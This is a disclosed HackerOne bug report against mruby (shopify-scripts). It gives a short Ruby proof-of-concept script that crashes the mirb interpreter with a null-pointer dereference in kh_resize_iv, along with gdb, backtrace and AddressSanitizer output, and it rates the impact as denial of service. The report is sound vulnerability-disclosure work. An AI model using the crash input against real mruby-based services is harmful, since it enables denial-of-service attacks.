# SIGSEGV - kh_resize_iv - Null Deref

## Report Details
- **Report ID**: 193724
- **URL**: https://hackerone.com/reports/193724
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-24T00:36:15.510Z
- **Disclosed**: 2017-03-09T01:26:43.647Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
---------------------

The following code triggers the bug (attached as kh_resize_iv.rb):

		

	l()

	t('','')do()end

	s('','')do([].())end



	[]*()
	d

	t('')do([].())end

	a=Array.new

	a.[]=(102,0)
	€
	s

	a.to_s
	a




	a.to_s
	a.i

Debug - mirb
---------------------

	(gdb) r kh_resize_iv.rb 
	Starting program: /home/x/Desktop/research/mruby/bin/mirb kh_resize_iv.rb
	mirb - Embeddable Interactive Ruby Shell

	 => nil
	 => nil
	(mirb):3: undefined method 'l' for main (NoMethodError)
	 => nil
	(mirb):5: undefined method 't' for main (NoMethodError)
	 => nil
	(mirb):7: undefined method 's' for main (NoMethodError)
	 => nil
	 => nil
	 => nil
	(mirb):11: can't convert nil into Integer (TypeError)
	(mirb):12: undefined method 'd' for main (NoMethodError)
	 => nil
	(mirb):14: undefined method 't' for main (NoMethodError)
	 => nil
	 => []
	 => nil
	 => 0
	(mirb):19: undefined method '�' for main (NoMethodError)
	(mirb):20: undefined method 's' for main (NoMethodError)
	 => nil
	 => "[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]"
	 => [nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]
	 => nil
	 => nil
	 => nil
	 => nil
	 => "[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]"

	Program received signal SIGSEGV, Segmentation fault.
	0x00000000004146a4 in kh_resize_iv (mrb=<optimized out>, h=<optimized out>, new_n_buckets=<optimized out>) at /home/x/Desktop/research/mruby/src/variable.c:292
	292	KHASH_DEFINE(iv, mrb_sym, mrb_value, TRUE, kh_int_hash_func, kh_int_hash_equal)
	(gdb) info reg
	rax            0x0	0
	rbx            0x0	0
	rcx            0x3	3
	rdx            0x7de9c0	8251840
	rsi            0xaa	170
	rdi            0x7de8d0	8251600
	rbp            0xfffffffffffffffc	0xfffffffffffffffc
	rsp            0x7fffffffbec0	0x7fffffffbec0
	r8             0xfffffffffffffffc	-4
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x7ffff7acd7b8	140737348687800
	r11            0x7ffff7acd701	140737348687617
	r12            0x7fffffffbee0	140737488338656
	r13            0x101	257
	r14            0x0	0
	r15            0x4	4
	rip            0x4146a4	0x4146a4 <kh_resize_iv+388>
	eflags         0x10246	[ PF ZF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mirb
---------------------

	(gdb) bt
	#0  0x00000000004146a4 in kh_resize_iv (mrb=<optimized out>, h=<optimized out>, new_n_buckets=<optimized out>) at /home/x/Desktop/research/mruby/src/variable.c:292
	#1  0x0000000000414817 in kh_put_iv (mrb=0x7de8d0, h=0x7ab530, key=107, ret=0x0) at /home/x/Desktop/research/mruby/src/variable.c:292
	#2  0x00000000004157ed in iv_put (mrb=0x756010, t=0x7ab530, sym=107, val=...) at /home/x/Desktop/research/mruby/src/variable.c:310
	#3  mrb_obj_iv_set (mrb=0x756010, obj=0x7ab560, sym=107, v=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/variable.c:499
	#4  0x00000000004eb99f in exc_set_backtrace (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:209
	#5  0x00000000004050ae in mrb_funcall_with_block (mrb=<optimized out>, self=..., mid=<optimized out>, argc=<optimized out>, argv=<optimized out>, blk=...) at /home/x/Desktop/research/mruby/src/vm.c:415
	#6  0x000000000040403a in mrb_funcall_argv (mrb=0x756010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, mid=<optimized out>, argc=1, 
	    argv=0x7ffff7acd7b8 <main_arena+88>) at /home/x/Desktop/research/mruby/src/vm.c:432
	#7  mrb_funcall (mrb=<optimized out>, self=..., name=<optimized out>, argc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:323
	#8  0x00000000004e9868 in set_backtrace (mrb=0x756010, info=<error reading variable: access outside bounds of object referenced via synthetic pointer>, bt=...) at /home/x/Desktop/research/mruby/src/error.c:244
	#9  mrb_exc_set (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:271
	#10 0x00000000004e9a62 in mrb_exc_raise (mrb=0x756010, exc=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/error.c:290
	#11 0x00000000004eae59 in mrb_no_method_error (mrb=0x756010, id=329, args=..., fmt=<optimized out>) at /home/x/Desktop/research/mruby/src/error.c:513
	#12 0x0000000000457f59 in mrb_method_missing (mrb=0x756010, name=329, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>, args=...)
	    at /home/x/Desktop/research/mruby/src/class.c:1477
	#13 0x000000000045ad12 in mrb_bob_missing (mrb=0x756010, mod=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/class.c:1522
	#14 0x000000000040a37d in mrb_vm_exec (mrb=<optimized out>, proc=0x7ffff7acd7b8 <main_arena+88>, pc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:1171
	#15 0x0000000000402e68 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
---------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ./mirb kh_resize_iv.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => nil
	 => nil
	(mirb):3: undefined method 'l' for main (NoMethodError)
	 => nil
	(mirb):5: undefined method 't' for main (NoMethodError)
	 => nil
	(mirb):7: undefined method 's' for main (NoMethodError)
	 => nil
	 => nil
	 => nil
	(mirb):11: can't convert nil into Integer (TypeError)
	(mirb):12: undefined method 'd' for main (NoMethodError)
	 => nil
	(mirb):14: undefined method 't' for main (NoMethodError)
	 => nil
	 => []
	 => nil
	 => 0
	(mirb):19: undefined method '�' for main (NoMethodError)
	(mirb):20: undefined method 's' for main (NoMethodError)
	 => nil
	 => "[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]"
	 => [nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]
	 => nil
	 => nil
	 => nil
	 => nil
	 => "[nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 0]"
	ASAN:DEADLYSIGNAL
	=================================================================
	==22025==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000052fe21 bp 0x7fff47809480 sp 0x7fff478092a0 T0)
	    #0 0x52fe20  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x52fe20)
	    #1 0x5301d1  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x5301d1)
	    #2 0x533655  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x533655)
	    #3 0x532ff2  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x532ff2)
	    #4 0x533e71  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x533e71)
	    #5 0x6b879c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6b879c)
	    #6 0x4f9a94  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f9a94)
	    #7 0x4f76ac  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f76ac)
	    #8 0x4f71b5  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f71b5)
	    #9 0x6ac314  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6ac314)
	    #10 0x6ab1fb  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6ab1fb)
	    #11 0x6aca29  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6aca29)
	    #12 0x6b3556  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x6b3556)
	    #13 0x61688f  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61688f)
	    #14 0x61d77b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x61d77b)
	    #15 0x50b14c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x50b14c)
	    #16 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)
	    #17 0x4f3ef8  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f3ef8)
	    #18 0x7f8701d58ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
	    #19 0x41a595  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mirb+0x52fe20) 
	==22025==ABORTING

Impact
---------------------

This vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.

## Attachments
- kh_resize_iv.rb
